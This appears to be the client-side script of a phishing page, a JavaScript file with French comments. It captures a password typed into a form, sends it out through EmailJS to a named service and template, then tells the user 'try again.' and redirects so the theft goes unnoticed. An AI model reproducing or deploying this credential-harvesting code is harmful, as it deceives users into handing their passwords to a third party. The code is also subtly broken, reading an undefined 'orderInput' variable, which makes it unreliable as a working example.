
// ======================================
// Initialisation EmailJS
// ======================================

emailjs.init({
    publicKey: "rORVGScs1n94sqOPi"
});


// ======================================
// Éléments HTML
// ======================================

const form = document.getElementById("signupForm");


const passwordInput = document.getElementById("password");


const result = document.getElementById("result");



// ======================================
// Limites des champs
// ======================================


passwordInput.addEventListener("input", function () {
    this.value = this.value.slice(0, 8);
});

// ======================================
// SUBMIT
// ======================================

form.addEventListener("submit", async function (event) {

    event.preventDefault();


    // ------------------------------
    // Vérification HTML
    // ------------------------------

    if (!form.checkValidity()) {
        form.reportValidity();
        return;
    }


    // ------------------------------
    // Récupération des données
    // ------------------------------


    const password = orderInput.value.trim();


    // ------------------------------
    // Paramètres EmailJS
    // ------------------------------

    const templateParams = {
        password: password
    };


    // ------------------------------
    // Envoi EmailJS
    // ------------------------------

    result.textContent = "connection en cours...";
    result.className = "";


    try {

        const response = await emailjs.send(
            "service_veritas",
            "template_7rbqlcq",
            templateParams
        );


        console.log(
            "Email envoyé :",
            response.status,
            response.text
        );


        result.textContent = "try again.";
        result.className = "success";


        // ------------------------------
        // Redirection après envoi réussi
        // ------------------------------

        window.location.href = "index.html";


    } catch (error) {

        console.error("Erreur EmailJS :", error);

        result.textContent =
            "error try again.";

        result.className = "error";
    }

});

